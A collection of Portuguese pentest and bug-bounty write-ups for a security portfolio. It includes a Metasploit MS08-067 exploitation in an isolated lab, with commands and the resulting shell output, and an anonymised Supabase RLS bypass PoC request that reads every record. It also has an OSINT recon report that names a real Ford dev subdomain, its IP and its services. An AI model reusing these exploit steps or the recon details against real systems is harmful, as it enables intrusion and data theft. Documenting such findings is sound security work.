<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-garciazn015
description: CTF writeups and security challenges by GarciaZn015.
---

# Writeups by GarciaZn015

Source repository: `/repos/GarciaZn015`

## Repository Index

- Pentest-Reports/CVE-2008-4250-MS08-067.md
- Pentest-Reports/CVE-2025-SaaS-Account-Takeover.md
- Pentest-Reports/OSINT-Ford-Attack-Surface.md
- Pentest-Reports/README.md

## Writeup Content


### File: Pentest-Reports/README.md

# Pentest-Reports
Repositório dedicado a armazenar meus relatórios de pentest, pesquisas de segurança e write-ups de Bug Bounty.

# 📂 Meu Portfólio de Cibersegurança

Bem-vindo ao meu repositório de pesquisas de segurança e pentest. Aqui eu documento vulnerabilidades reais (anonimizadas) que encontro em aplicações web e APIs.

## 📝 Meus Relatórios (Write-ups)

* [Bypass de Pagamento e Vazamento de Dados em SaaS (Supabase RLS Misconfig)](CVE-2025-SaaS-Account-Takeover.md)
* [Exploração Controlada da Vulnerabilidade MS08-067 (Windows XP SP3)](CVE-2008-4250-MS08-067.md)
* [Reconhecimento de Superfície de Ataque e OSINT: Ford Motor Company](OSINT-Ford-Attack-Surface.md)

---
*Aviso: Todas as pesquisas aqui documentadas seguem os princípios da Divulgação Responsável (Responsible Disclosure). Nomes de empresas e URLs reais são ocultados quando a falha ainda não foi publicamente corrigida.*



### File: Pentest-Reports/CVE-2008-4250-MS08-067.md

# 🛡️ Exploração Controlada da Vulnerabilidade MS08-067 (Windows XP SP3)

Este repositório documenta um laboratório prático de cibersegurança executado em um ambiente estritamente isolado. O foco principal é a análise e exploração da vulnerabilidade **MS08-067 (NetAPI)** utilizando o **Metasploit Framework**. 

O objetivo deste projeto é reforçar os fundamentos de exploração, táticas de pós-exploração e, principalmente, a análise de limitações de infraestrutura de rede (como restrições de NAT/WSL2) em cenários corporativos simulados.

## 1. 🏗️ Arquitetura do Ambiente

O laboratório foi construído garantindo isolamento total, sem exposição à internet externa.

| Componente | Descrição |
| :--- | :--- |
| **Atacante** | Kali Linux (executando via WSL2) |
| **Alvo** | Windows XP SP3 (VirtualBox) |
| **Rede** | `192.168.56.0/24` (Host-Only Network) |
| **Ferramentas** | Metasploit Framework 6, Nmap |
| **Segurança** | Ambiente 100% *offline* e isolado |

## 2. 🔍 Escaneamento e Enumeração

A fase inicial consistiu no mapeamento da rede e identificação de serviços expostos no alvo. O escaneamento revelou a porta `445/TCP` (SMB) ativa. 

A enumeração do sistema operacional confirmou a versão do alvo:
* **Target:** Windows XP SP3 - Português Brasil

## 3. 💥 Execução do Exploit (MS08-067)



Para a exploração, foi utilizado o módulo SMB do Metasploit específico para a falha NetAPI. 

**Nota de Infraestrutura:** Devido às restrições inerentes de rede do WSL2 (que atua atrás de um NAT virtual, dificultando o recebimento de conexões reversas), a estratégia de ataque foi adaptada para utilizar um *payload* do tipo `bind_tcp` em vez do tradicional `reverse_tcp`.

```bash
# Configuração no msfconsole
use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/shell/bind_tcp
set RHOSTS 192.168.56.102
set TARGET 51
exploit

[*] Started bind TCP handler against 192.168.56.102:4444
[*] Command shell session 1 opened (192.168.56.1:xxxxx -> 192.168.56.102:4444)

Microsoft Windows XP [Versão 5.1.2600]
C:\WINDOWS\system32>



### File: Pentest-Reports/CVE-2025-SaaS-Account-Takeover.md

# 🛡️ Pentest Report: Múltiplas Falhas Críticas em SaaS de Agendamentos (Supabase RLS Bypass)

**Autor:** Matheus Garcia  
**Data:** Dezembro de 2025  
**Alvo:** `[REDACTED].com.br` (Plataforma SaaS de Gestão)  
**Tecnologia:** React / Supabase (PostgreSQL)  
**Status:** Reportado ao vendor (Responsibility Disclosure)  

---

## 📌 1. Resumo Executivo
Durante uma análise de segurança em um software SaaS de gestão de barbearias (`[REDACTED]`), identifiquei uma série de vulnerabilidades críticas decorrentes de falhas de arquitetura e má configuração de políticas de segurança (Row Level Security - RLS) no Supabase. 

As falhas permitiam um comprometimento total da aplicação (Account Takeover, Mass Assignment, Data Leakage e Business Logic Bypass), permitindo que qualquer usuário autenticado manipulasse dados de outras empresas, vazasse informações financeiras e ativasse planos pagos gratuitamente.

---

## 🐞 2. Vulnerabilidades Encontradas

### 🔴 2.1. Vazamento Massivo de Dados (Data Leakage)
A ausência de políticas RLS em tabelas sensíveis permitia que qualquer usuário com a permissão básica (`role: authenticated`) lesse todos os registros do banco de dados.

* **Vetor:** Requisição `GET` direta à API REST do Supabase.
* **PoC (Proof of Concept):**
  ```http
  GET /rest/v1/appointments?select=* HTTP/2
  Host: [REDACTED].supabase.co
  Authorization: Bearer <TOKEN_USUARIO_COMUM>
  apikey: <ANON_KEY>



### File: Pentest-Reports/OSINT-Ford-Attack-Surface.md

# 🗺️ Reconhecimento de Superfície de Ataque e OSINT: Ford Motor Company

**Autor**: Matheus Garcia dos Santos
**Data**: 27 de Fevereiro de 2026
**Alvo**: Ford Motor Company (Infraestrutura Externa / Shadow IT)
**Metodologia**: OSINT (Open Source Intelligence) e Mapeamento de Ativos de Rede

---

## 📌 1. RESUMO EXECUTIVO

Este relatório detalha uma auditoria de inteligência de fontes abertas (OSINT) focada na infraestrutura externa da **Ford Motor Company**. O objetivo foi identificar ativos expostos, subdomínios órfãos e falhas de configuração em ambientes de desenvolvimento que pudessem servir como vetores de ataque inicial.

A investigação identificou ambientes de desenvolvimento (Shadow IT) operando fora do perímetro de segurança principal, utilizando tecnologias legadas e expondo informações sobre a arquitetura de autenticação da organização.

---

## 🔍 2. RECONHECIMENTO PASSIVO (GOOGLE DORKING)

Utilizando operadores avançados de busca, o perímetro foi mapeado de forma furtiva, focando em subdomínios de desenvolvimento e arquivos sensíveis.

* **Identificação de Ambiente Crítico**: Localizado o subdomínio `privacy-storage-ui-dev.ford.com`.
* **Vazamento de Informação (Information Disclosure)**: Encontrados documentos PDF indexados como "Confidential" e "Internal Use Only", expondo metadados e convenções internas de nomenclatura.
* **Análise de Autenticação**: O ambiente identificado utiliza **Home Realm Discovery (HRD)**. A inserção de inputs como `admin` redireciona o usuário para o Single Sign-On (SSO) da Microsoft (Azure AD), indicando uma superfície para enumeração de usuários corporativos.

---

## 🌐 3. MAPEAMENTO DE INFRAESTRUTURA E FINGERPRINTING

A resolução de DNS e o escaneamento de portas revelaram detalhes sobre a hospedagem e os serviços ativos no ativo identificado.

### 📡 Dados de Rede
* **Endereço IP**: `34.102.178.213`
* **Provedor (ISP)**: Google Cloud Platform (GCP)
* **Hostname**: `213.178.102.34.bc.googleusercontent.com`

### 🛠️ Fingerprinting de Serviços (Nmap)
O escaneamento via Nmap revelou as seguintes portas e cabeçalhos:

| Porta | Estado | Serviço | Versão/Banner |
| :--- | :--- | :--- | :--- |
| 80/tcp | Aberta | HTTP | Redirect para 443 |
| 443/tcp | Aberta | HTTPS | Microsoft IIS (ASP.NET) |

* **Análise Técnica**: O cabeçalho de resposta HTTP 404 e o estilo CSS da página de erro confirmam o uso de **Microsoft IIS**. O acesso direto via IP revelou uma instância de login do **Appspace**, sugerindo o uso de *Virtual Hosting* para múltiplos serviços administrativos no mesmo ativo de rede.
* **Configuração de Segurança**: Detectado o cabeçalho `Strict-Transport-Security (HSTS)` ativo, forçando conexões via SSL/TLS.

---

## ⚠️ 4. RISCOS IDENTIFICADOS E RECOMENDAÇÕES

1.  **Exposição de Shadow IT**: Ambientes de desenvolvimento (`-dev`) acessíveis via internet pública representam um risco alto, pois costumam ter controles de segurança mais brandos que a produção.
2.  **Gestão de Certificados**: A detecção de certificados SSL inválidos ou expirados em subdomínios ativos facilita ataques de *Man-in-the-Middle* (MitM).
3.  **Enumeração de Usuários**: A resposta diferenciada do formulário de login conforme o e-mail inserido permite a descoberta de credenciais válidas.

**Recomendações**:
* Implementar restrição de acesso por IP ou VPN para todos os subdomínios `-dev`.
* Unificar o monitoramento de ativos de nuvem para identificar instâncias criadas fora do controle da equipe de segurança central.

---

**Isenção de Responsabilidade**: *Este relatório foi gerado para fins de portfólio técnico e educacional. Todos os testes seguiram princípios éticos de não intrusão, utilizando apenas dados públicos e autorizados por programas de divulgação responsável.*

